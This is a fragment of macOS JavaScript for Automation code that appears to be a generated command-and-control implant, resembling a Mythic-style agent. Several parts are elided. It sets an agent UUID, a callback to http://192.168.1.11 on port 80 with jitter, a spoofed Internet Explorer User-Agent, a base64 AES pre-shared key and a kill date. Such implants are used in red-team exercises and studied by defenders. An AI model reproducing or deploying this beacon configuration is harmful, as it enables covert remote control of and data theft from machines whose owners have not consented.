...
class agent{
	constructor(){
		...
		this.uuid = "b64d7222-0aa2-4ccb-bc08-462010a556dd";
...
class customC2 extends baseC2{
	constructor(interval, cback_host, cback_port){
		...
		this.jitter = 23;
		this.header_list = {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"};
		this.aes_psk = "5zKpatVmFQv2NclZ5G6R25kCQYvxa6Cu+NIpQj6nlNA="; // base64 encoded key
		if(this.aes_psk !== ""){
		...
		if("2026-02-24" !== "yyyy-mm-dd" && "2026-02-24" !== ""){
			this.dateFormatter = $.NSDateFormatter.alloc.init;
			this.dateFormatter.setDateFormat("yyyy-MM-dd");
			this.kill_date = this.dateFormatter.dateFromString('2026-02-24');
		}else{
...
var C2 = new customC2(2, "http://192.168.1.11", "80");
//-------------SHARED COMMAND CODE ------------------------
